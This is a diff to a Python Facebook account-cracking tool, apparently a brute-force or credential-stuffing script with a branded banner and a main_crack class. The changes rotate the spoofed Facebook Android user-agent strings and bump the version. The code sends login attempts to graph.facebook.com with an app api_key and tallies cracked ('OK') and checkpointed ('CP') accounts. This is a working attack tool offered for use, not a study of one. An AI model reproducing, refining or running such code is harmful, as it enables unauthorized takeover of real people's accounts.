@@ -60,7 +60,7 @@ logo =f"""{A}
     {G2}dMP.dMP dMP"dMP dMP"dMP"dMP  .dMP" amr  
     {G3}dMMMMK" dMMMMMP dMP dMP dMP .dMP"  dMP   
     {G4}dMP"AMF dMP dMP dMP dMP dMP.dMP"   dMP    
-    {G5}dMP dMP dMP dMP dMP dMP dMPdMMMMMP dMP {G1}[{A}V{G1}/{A}7.9{G1}]
+    {G5}dMP dMP dMP dMP dMP dMP dMPdMMMMMP dMP {G1}[{A}V{G1}/{A}8.9{G1}]
 {A}──────────────────────────────────────────────────
 {G1}[{A}={G1}]{G1} OWNER    {A}:{G1} ANIS SCHIAPARELLI 
 {G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} ANIS M. SCHIAPARELLI 
@@ -219,7 +219,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/144.75.7.83;FBBV/53333221;FBDM/{density=1.5,width=1148,height=2504};FBLC/en_US;FBRV/79111964;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/5.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/174.70.67.80;FBBV/98452084;FBDM/{density=3.4,width=992,height=2211};FBLC/en_US;FBRV/47470075;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
             sys.stdout.write(f"\r{G1}[{A}ANS-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
@@ -317,7 +317,7 @@ class main_crack():
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
+                headers = {'User-Agent': '[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.0,width=1080,height=2029};FBLC/en_US;FBRV/212198177;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
                     'X-FB-Net-HNI': str(random.randint(20000, 40000)),
